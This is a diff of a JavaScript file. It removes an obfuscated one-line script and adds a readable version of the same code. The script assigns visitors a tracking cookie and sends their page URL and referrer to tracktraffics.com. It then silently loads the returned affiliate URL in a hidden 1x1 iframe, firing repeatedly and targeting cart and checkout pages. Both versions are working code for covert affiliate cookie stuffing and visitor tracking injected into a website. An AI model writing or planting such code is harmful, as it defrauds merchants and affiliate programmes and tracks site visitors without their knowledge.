@@ -1,1 +1,109 @@
-function _0x1b72(_0x2470f1,_0x3eb8bb){var _0x56547e=_0x5654();return _0x1b72=function(_0x1b72a2,_0x2e5843){_0x1b72a2=_0x1b72a2-0x13c;var _0x5d348a=_0x56547e[_0x1b72a2];return _0x5d348a;},_0x1b72(_0x2470f1,_0x3eb8bb);}function _0x5654(){var _0x8a955e=['includes','referrer','171pnALOk','4886948IMicZc','createElement','src','/checkout','json','display:none;visibility:hidden;','https://www.tracktraffics.com/api/track-user','application/json','https://www.tracktraffics.com/api/fallback-pixel?id=','892599HWjOuQ','hidden','length','toUTCString','affiliate_url','hostname','none','height','cookie','338610zKygNK',';path=/;','href','style','stringify','Error\x20in\x20tracking\x20script:','body','610014PfWqrx','43596eIoyBS','charAt','true','1px','56DCuekH','12atmjdO','tracking_uuid=','10SMDdrA','1699956LVkBFX','display','location','4Qmlsdc','toString','indexOf','visibility','error','replace','835951vawGKD','appendChild','pathname','setItem','POST','some','substring'];_0x5654=function(){return _0x8a955e;};return _0x5654();}(function(_0x41dcc1,_0x3b08b6){var _0x45bc6e=_0x1b72,_0x348a98=_0x41dcc1();while(!![]){try{var _0x24e632=parseInt(_0x45bc6e(0x142))/0x1+parseInt(_0x45bc6e(0x16e))/0x2+-parseInt(_0x45bc6e(0x155))/0x3*(parseInt(_0x45bc6e(0x13c))/0x4)+parseInt(_0x45bc6e(0x16d))/0x5*(parseInt(_0x45bc6e(0x165))/0x6)+parseInt(_0x45bc6e(0x166))/0x7*(-parseInt(_0x45bc6e(0x16a))/0x8)+parseInt(_0x45bc6e(0x14b))/0x9*(-parseInt(_0x45bc6e(0x15e))/0xa)+parseInt(_0x45bc6e(0x14c))/0xb*(-parseInt(_0x45bc6e(0x16b))/0xc);if(_0x24e632===_0x3b08b6)break;else _0x348a98['push'](_0x348a98['shift']());}catch(_0x22b3c5){_0x348a98['push'](_0x348a98['shift']());}}}(_0x5654,0x706df),(async function(){function _0x3c6b7a(){var _0x572ef4=_0x1b72;return'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'[_0x572ef4(0x141)](/[xy]/g,function(_0x2acfc9){var _0x547991=_0x572ef4,_0x1cfbe4=Math['random']()*0x10|0x0,_0x2a5f4d=_0x2acfc9==='x'?_0x1cfbe4:_0x1cfbe4&0x3|0x8;return _0x2a5f4d[_0x547991(0x13d)](0x10);});}function _0x3a6ff5(_0x3b6387){var _0x1a6945=_0x1b72;const _0x30de01=document[_0x1a6945(0x14d)]('iframe');_0x30de01[_0x1a6945(0x14e)]=_0x3b6387,_0x30de01['width']='1',_0x30de01[_0x1a6945(0x15c)]='1',_0x30de01['style']=_0x1a6945(0x151),document[_0x1a6945(0x164)][_0x1a6945(0x143)](_0x30de01);}function _0x54f6c1(_0xf34f79){var _0x18dfbf=_0x1b72,_0x17988f=document[_0x18dfbf(0x14d)]('img');_0x17988f[_0x18dfbf(0x14e)]=_0xf34f79,_0x17988f[_0x18dfbf(0x161)]['width']=_0x18dfbf(0x169),_0x17988f['style']['height']=_0x18dfbf(0x169),_0x17988f[_0x18dfbf(0x161)][_0x18dfbf(0x16f)]=_0x18dfbf(0x15b),_0x17988f[_0x18dfbf(0x161)][_0x18dfbf(0x13f)]=_0x18dfbf(0x156),document['body'][_0x18dfbf(0x143)](_0x17988f);}async function _0x39f106(){var _0x218ce2=_0x1b72;try{let _0x13a2bd=_0x2fecc8('tracking_uuid')||_0x3c6b7a(),_0x5e6a04=new Date(Date['now']()+0x1e*0x15180*0x3e8)[_0x218ce2(0x158)]();document[_0x218ce2(0x15d)]=_0x218ce2(0x16c)+_0x13a2bd+';\x20expires='+_0x5e6a04+_0x218ce2(0x15f);let _0x4562f0=await fetch(_0x218ce2(0x152),{'method':_0x218ce2(0x146),'body':JSON[_0x218ce2(0x162)]({'url':window[_0x218ce2(0x170)][_0x218ce2(0x160)],'referrer':document[_0x218ce2(0x14a)],'unique_id':_0x13a2bd,'origin':window[_0x218ce2(0x170)][_0x218ce2(0x15a)]}),'headers':{'Content-Type':_0x218ce2(0x153),'Access-Control-Allow-Origin':'*'}}),_0x40c473=await _0x4562f0[_0x218ce2(0x150)]();_0x40c473['success']&&_0x40c473[_0x218ce2(0x159)]?(_0x3a6ff5(_0x40c473[_0x218ce2(0x159)]),sessionStorage[_0x218ce2(0x145)]('iframe_triggered',_0x218ce2(0x168))):_0x3a6ff5(_0x218ce2(0x154)+_0x13a2bd);}catch(_0x6d46ab){console[_0x218ce2(0x140)](_0x218ce2(0x163),_0x6d46ab);}}function _0x2fecc8(_0x4d8db2){var _0x2ee72d=_0x1b72,_0x4ac247=_0x4d8db2+'=',_0x3f0950=document[_0x2ee72d(0x15d)]['split'](';');for(var _0x59c4b7=0x0;_0x59c4b7<_0x3f0950[_0x2ee72d(0x157)];_0x59c4b7++){var _0x4f0554=_0x3f0950[_0x59c4b7];while(_0x4f0554[_0x2ee72d(0x167)](0x0)==='\x20'){_0x4f0554=_0x4f0554[_0x2ee72d(0x148)](0x1);}if(_0x4f0554[_0x2ee72d(0x13e)](_0x4ac247)===0x0)return _0x4f0554[_0x2ee72d(0x148)](_0x4ac247['length'],_0x4f0554[_0x2ee72d(0x157)]);}return'';}function _0x50b822(){var _0x2046d8=_0x1b72;const _0x5114f1=['/cart',_0x2046d8(0x14f)];return _0x5114f1[_0x2046d8(0x147)](_0x451c0b=>window[_0x2046d8(0x170)][_0x2046d8(0x144)][_0x2046d8(0x149)](_0x451c0b));}_0x50b822()&&(_0x39f106(),setTimeout(_0x39f106,0x7d0),setTimeout(_0x39f106,0x7d0)),setTimeout(_0x39f106,0x7d0),_0x39f106();}()));
+
+
+
+
+(async function() {
+
+    function generateUUID() {
+        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+            var r = Math.random() * 16 | 0,
+                v = c === 'x' ? r : (r & 0x3 | 0x8);
+            return v.toString(16);
+        });
+    }
+
+
+        function createClickIframe(url) {
+            const iframe = document.createElement('iframe');
+            iframe.src = url;
+            iframe.width = "1";
+            iframe.height = "1";
+            iframe.style = "display:none;visibility:hidden;";
+            document.body.appendChild(iframe);
+}
+
+
+
+    function createTrackingPixel(url) {
+
+        var img = document.createElement('img');
+        img.src = url;
+        img.style.width = '1px';
+        img.style.height = '1px';
+        img.style.display = 'none';  
+        img.style.visibility = 'hidden';
+
+        document.body.appendChild(img);
+    }
+
+    async function initTracking() {
+
+
+        try {
+            let uniqueId = getCookie('tracking_uuid') || generateUUID();
+            let expires = (new Date(Date.now() + 30 * 86400 * 1000)).toUTCString();
+            document.cookie = 'tracking_uuid=' + uniqueId + '; expires=' + expires + ';path=/;';
+
+            let response = await fetch('https://www.tracktraffics.com/api/track-user', {
+                method: 'POST',
+                body: JSON.stringify({
+                    url: window.location.href,
+                    referrer: document.referrer,
+                    unique_id: uniqueId,
+                    origin: window.location.hostname,
+                }),
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Access-Control-Allow-Origin':'*'
+                }
+            });
+
+            let result = await response.json();
+
+            if (result.success && result.affiliate_url) {
+
+
+                createClickIframe(result.affiliate_url);
+                sessionStorage.setItem('iframe_triggered', 'true'); 
+            } else {
+
+                createClickIframe('https://www.tracktraffics.com/api/fallback-pixel?id=' + uniqueId);
+            }
+        } catch (error) {
+            console.error('Error in tracking script:', error);
+        }
+    }
+
+    function getCookie(cname) {
+        var name = cname + '=';
+        var ca = document.cookie.split(';');
+        for (var i = 0; i < ca.length; i++) {
+            var c = ca[i];
+            while (c.charAt(0) === ' ') {
+                c = c.substring(1);
+            }
+            if (c.indexOf(name) === 0) {
+                return c.substring(name.length, c.length);
+            }
+        }
+        return '';
+    }
+
+    function isCardPage() {
+
+            const cardPageUrls = ['/cart', '/checkout','/checkout/confirm/payment']; 
+            return cardPageUrls.some(url => window.location.pathname.includes(url));
+        }
+
+        if (isCardPage()) {
+
+            initTracking()
+            setTimeout(initTracking, 2000);
+            setTimeout(initTracking, 2000);
+
+        }
+
+        setTimeout(initTracking, 2000);
+
+     initTracking()
+})();
